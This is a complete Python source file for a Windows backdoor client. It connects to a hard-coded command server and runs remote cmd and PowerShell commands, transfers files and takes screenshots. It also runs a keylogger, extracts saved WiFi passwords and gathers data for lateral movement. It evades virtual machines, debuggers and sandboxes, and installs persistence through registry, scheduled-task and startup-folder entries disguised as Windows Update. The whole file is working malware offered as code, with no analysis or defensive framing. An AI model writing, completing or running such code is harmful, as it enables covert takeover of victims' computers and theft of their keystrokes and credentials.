import socket
import subprocess
import os
import time
import base64
import winreg
import sqlite3
import shutil
from threading import Thread
import json
import random
import string
import sys

class AdvancedBackdoorClient:
    def __init__(self, host="192.168.72.132", port=4444):
        self.host = host
        self.port = port
        self.end_marker = "<END_OF_RESULT>"
        self.file_marker = "<END_OF_FILE>"
        self.session_id = self.generate_session_id()
        self.anti_analysis = AntiAnalysis()
        self.persistence = PersistenceManager()
        self.keylogger = Keylogger()
        self.data_exfil = DataExfiltration()
        
    def generate_session_id(self):
        """Generate random session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
    def connect(self):
        if self.anti_analysis.detect_analysis():
            time.sleep(3600)  
            return
            

        self.persistence.install()
        

        self.keylogger.start()
        self.data_exfil.start_monitoring()
        
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((self.host, self.port))
                
                self.send_client_info()
                self.handle_commands()
                
            except Exception as e:
                time.sleep(30)  
    
    def send_client_info(self):
        """Send comprehensive client information to C2"""
        client_info = {
            'session_id': self.session_id,
            'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
            'username': os.environ.get('USERNAME', 'Unknown'),
            'os': os.name,
            'privileges': self.check_privileges(),
            'antivirus': self.detect_antivirus(),
            'network_info': self.get_network_info(),
            'process_id': os.getpid()
        }
        self.sock.send(f"CLIENT_INFO:{json.dumps(client_info)}{self.end_marker}".encode())
    
    def handle_commands(self):
        while True:
            try:
                data = self.sock.recv(8192).decode('utf-8', errors='ignore').strip()
                if not data:
                    continue
                
                if data.startswith("CMD:"):
                    self.execute_command(data[4:])
                elif data.startswith("POWERSHELL:"):
                    self.execute_powershell(data[11:])
                elif data.startswith("DOWNLOAD:"):
                    self.download_file(data[9:])
                elif data.startswith("UPLOAD:"):
                    self.upload_file(data[7:])
                elif data == "SCREENSHOT":
                    self.take_screenshot()
                elif data == "KEYLOGS":
                    self.send_keylogs()
                elif data == "PERSIST":
                    self.persistence.install()
                elif data == "LATERAL":
                    self.lateral_movement()
                elif data == "EXFILTRATE":
                    self.data_exfil.exfiltrate_all()
                elif data == "PROCESS_LIST":
                    self.get_process_list()
                elif data == "NETWORK_INFO":
                    self.get_network_info_detailed()
                elif data.lower() == "exit":
                    break
                elif data.lower() == "stop":
                    self.sock.close()
                    return
                else:
                    self.execute_command(data)
                    
            except socket.timeout:
                continue
            except Exception as e:
                break
    
    def execute_command(self, cmd):
        try:
            if os.name == 'nt':
                process = subprocess.Popen(
                    ["cmd", "/c", cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    shell=True
                )
            
            stdout, stderr = process.communicate(timeout=60)
            output = stdout.decode('utf-8', errors='ignore') if stdout else ""
            if stderr:
                output += f"\nERROR: {stderr.decode('utf-8', errors='ignore')}"
            
            if not output.strip():
                output = "Command executed successfully (no output)"
                
            self.send_result(output)
            
        except subprocess.TimeoutExpired:
            self.send_result("Error: Command timed out after 60 seconds")
        except Exception as e:
            self.send_result(f"Command execution error: {e}")
    
    def execute_powershell(self, script):
        """Execute PowerShell scripts"""
        try:
            encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
            process = subprocess.Popen(
                ["powershell", "-EncodedCommand", encoded_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True
            )
            stdout, stderr = process.communicate(timeout=60)
            output = stdout.decode('utf-8', errors='ignore') if stdout else ""
            if stderr:
                output += f"\nERROR: {stderr.decode('utf-8', errors='ignore')}"
            self.send_result(output)
        except Exception as e:
            self.send_result(f"PowerShell error: {e}")
    
    def download_file(self, file_path):
        """Enhanced file download with progress"""
        try:
            if not os.path.isabs(file_path):
                file_path = os.path.join(os.getcwd(), file_path)
            
            if os.path.exists(file_path):
                file_size = os.path.getsize(file_path)
                self.sock.send(f"FILE_START:{file_size}:{os.path.basename(file_path)}".encode())
                time.sleep(0.5)
                
                sent_bytes = 0
                with open(file_path, "rb") as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        self.sock.send(chunk)
                        sent_bytes += len(chunk)
                
                self.sock.send(self.file_marker.encode())
                self.send_result(f"File downloaded successfully: {file_path} ({file_size} bytes)")
            else:
                self.send_result(f"Error: File not found - {file_path}")
        except Exception as e:
            self.send_result(f"Download error: {e}")
    
    def upload_file(self, file_data):
        """Receive and save file from C2"""
        try:
            filename, content = file_data.split(':', 1)
            file_path = os.path.join(os.getcwd(), filename)
            
            with open(file_path, "wb") as f:
                f.write(base64.b64decode(content))
            
            self.send_result(f"File uploaded successfully: {file_path}")
        except Exception as e:
            self.send_result(f"Upload error: {e}")
    
    def take_screenshot(self):
        """Take screenshot using native Windows API"""
        try:
            ps_script = """
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            
            $filename = "screenshot_" + [DateTime]::Now.Ticks + ".png"
            $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
            $graphics.Dispose()
            $bitmap.Dispose()
            
            Write-Output $filename
            """
            
            encoded_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
            process = subprocess.Popen(
                ["powershell", "-EncodedCommand", encoded_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True
            )
            stdout, stderr = process.communicate(timeout=30)
            
            if stdout:
                filename = stdout.decode().strip()
                self.send_result(f"Screenshot saved: {filename}")
            else:
                self.send_result("Screenshot failed")
                
        except Exception as e:
            self.send_result(f"Screenshot error: {e}")
    
    def lateral_movement(self):
        """Attempt lateral movement techniques"""
        try:
            # Network discovery
            commands = [
                "net view",
                "nltest /dclist:",
                "arp -a",
                "netstat -ano",
                "net share",
                "whoami /all"
            ]
            
            results = []
            for cmd in commands:
                try:
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate(timeout=30)
                    results.append(f"=== {cmd} ===\n{stdout.decode('utf-8', errors='ignore')}")
                except:
                    results.append(f"=== {cmd} ===\nCommand failed")
            
            self.send_result("\n".join(results))
        except Exception as e:
            self.send_result(f"Lateral movement error: {e}")
    
    def send_keylogs(self):
        """Send captured keystrokes"""
        try:
            logs = self.keylogger.get_logs()
            self.send_result(f"Keylogs:\n{logs}")
        except Exception as e:
            self.send_result(f"Keylog error: {e}")
    
    def get_process_list(self):
        """Get running processes"""
        try:
            if os.name == 'nt':
                process = subprocess.Popen(
                    ["tasklist", "/fo", "csv", "/nh"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    ["ps", "aux"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
            
            stdout, stderr = process.communicate(timeout=30)
            output = stdout.decode('utf-8', errors='ignore') if stdout else ""
            self.send_result(f"Running Processes:\n{output}")
        except Exception as e:
            self.send_result(f"Process list error: {e}")
    
    def get_network_info_detailed(self):
        """Get detailed network information"""
        try:
            commands = [
                "ipconfig /all",
                "netstat -n",
                "route print",
                "netsh interface show interface"
            ]
            
            results = []
            for cmd in commands:
                try:
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate(timeout=30)
                    results.append(f"=== {cmd} ===\n{stdout.decode('utf-8', errors='ignore')}")
                except:
                    results.append(f"=== {cmd} ===\nCommand failed")
            
            self.send_result("\n".join(results))
        except Exception as e:
            self.send_result(f"Network info error: {e}")
    
    def check_privileges(self):
        """Check if running with admin privileges"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def detect_antivirus(self):
        """Detect installed antivirus software"""
        av_processes = [
            "msmpeng.exe", "avp.exe", "bdagent.exe", 
            "avastui.exe", "avgui.exe", "nortonsecurity.exe"
        ]
        
        try:
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
            detected = [av for av in av_processes if av in output]
            return detected if detected else ["None detected"]
        except:
            return ["Unknown"]
    
    def get_network_info(self):
        """Gather network information"""
        try:
            ipconfig = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
            return ipconfig
        except:
            return "Network info unavailable"
    
    def send_result(self, result):
        try:
            if not isinstance(result, str):
                result = str(result)
            full_result = result + self.end_marker
            self.sock.send(full_result.encode('utf-8'))
        except:
            pass

class AntiAnalysis:
    def detect_analysis(self):
        """Check for analysis environments"""
        checks = [
            self.check_vm(),
            self.check_debugger(),
            self.check_sandbox(),
            self.check_analysis_tools()
        ]
        return any(checks)
    
    def check_vm(self):
        """Check for virtual machine"""
        vm_indicators = [
            os.path.exists(r"C:\Program Files\VMware"),
            os.path.exists(r"C:\Program Files\Oracle\VirtualBox"),
            any(proc in os.popen('tasklist').read().lower() for proc in ['vmtoolsd.exe', 'vmwaretray.exe'])
        ]
        return any(vm_indicators)
    
    def check_debugger(self):
        """Check for debugger presence"""
        try:
            import ctypes
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False
    
    def check_sandbox(self):
        """Check for sandbox environment"""
        
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            tick_count = kernel32.GetTickCount()
           
            return tick_count < 3600000  
        except:
            return False
    
    def check_analysis_tools(self):
        """Check for analysis tools"""
        analysis_processes = ['wireshark', 'procmon', 'processhacker', 'ollydbg', 'x64dbg', 'fiddler']
        try:
            running = os.popen('tasklist').read().lower()
            return any(tool in running for tool in analysis_processes)
        except:
            return False

class PersistenceManager:
    def install(self):
        """Install multiple persistence mechanisms"""
        try:
            self.registry_persistence()
            self.scheduled_task_persistence()
            self.startup_folder_persistence()
            return "Persistence installed successfully"
        except Exception as e:
            return f"Persistence error: {e}"
    
    def registry_persistence(self):
        """Add to Windows Registry Run key"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        except:
            pass
    
    def scheduled_task_persistence(self):
        """Create scheduled task for persistence"""
        try:
            task_name = "WindowsUpdateService"
            cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onlogon /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
    
    def startup_folder_persistence(self):
        """Copy to startup folder"""
        try:
            startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.exists(startup_path):
                target_path = os.path.join(startup_path, "WindowsUpdate.exe")
                if not os.path.exists(target_path):
                    shutil.copy2(sys.executable, target_path)
        except:
            pass

class Keylogger:
    def __init__(self):
        self.logs = []
        self.running = False
    
    def start(self):
        """Start keylogging in background thread"""
        if not self.running:
            self.running = True
            thread = Thread(target=self._keylogger_thread)
            thread.daemon = True
            thread.start()
    
    def _keylogger_thread(self):
        """Simple keylogger using Windows API"""
        try:
            import ctypes
            from ctypes import wintypes
            
            
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            
            
            def low_level_keyboard_proc(nCode, wParam, lParam):
                if wParam == WM_KEYDOWN:
                    key_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
                    self.logs.append(f"Key: {key_code}")
                
                
                return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)
            
           
            hook_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(low_level_keyboard_proc)
            hook_id = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
            
    
            msg = wintypes.MSG()
            while self.running:
                ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            
 
            ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
            
        except Exception as e:
  
            pass
    
    def get_logs(self):
        """Get captured keystrokes"""
        logs = self.logs.copy()
        self.logs.clear()  
        return "\n".join(logs) if logs else "No keylogs captured"

class DataExfiltration:
    def __init__(self):
        self.monitoring = False
    
    def start_monitoring(self):
        """Start monitoring for sensitive data"""
        self.monitoring = True
    
    def exfiltrate_all(self):
        """Exfiltrate all sensitive data"""
        try:
            data_sources = {
                'wifi_passwords': self.get_wifi_passwords(),
                'system_info': self.get_system_info(),
                'browser_info': self.get_browser_info()
            }
            return str(data_sources)
        except Exception as e:
            return f"Exfiltration error: {e}"
    
    def get_wifi_passwords(self):
        """Extract WiFi passwords"""
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8', errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
            
            passwords = {}
            for profile in profiles[:5]: 
                try:
                    cmd = f'netsh wlan show profile "{profile}" key=clear'
                    result = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
                    for line in result.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords[profile] = password
                            break
                except:
                    continue
            
            return passwords
        except:
            return {}
    
    def get_system_info(self):
        """Gather comprehensive system information"""
        info = {
            'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
            'user_name': os.environ.get('USERNAME', 'Unknown'),
            'windows_version': self.get_windows_version(),
            'processor': self.get_processor_info(),
            'memory': self.get_memory_info()
        }
        return info
    
    def get_browser_info(self):
        """Get basic browser information"""
        try:
            
            browsers = []
            browser_paths = [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
            ]
            
            for path in browser_paths:
                if os.path.exists(path):
                    browsers.append(os.path.basename(path))
            
            return browsers if browsers else ["No browsers detected"]
        except:
            return ["Browser detection failed"]
    
    def get_windows_version(self):
        try:
            return subprocess.check_output("ver", shell=True).decode('utf-8', errors='ignore').strip()
        except:
            return "Unknown"
    
    def get_processor_info(self):
        try:
            return subprocess.check_output("wmic cpu get name", shell=True).decode('utf-8', errors='ignore').split('\n')[1].strip()
        except:
            return "Unknown"
    
    def get_memory_info(self):
        try:
            return subprocess.check_output("wmic memorychip get capacity", shell=True).decode('utf-8', errors='ignore')
        except:
            return "Unknown"

def main():
    client = AdvancedBackdoorClient()
    client.connect()

if __name__ == "__main__":
    main()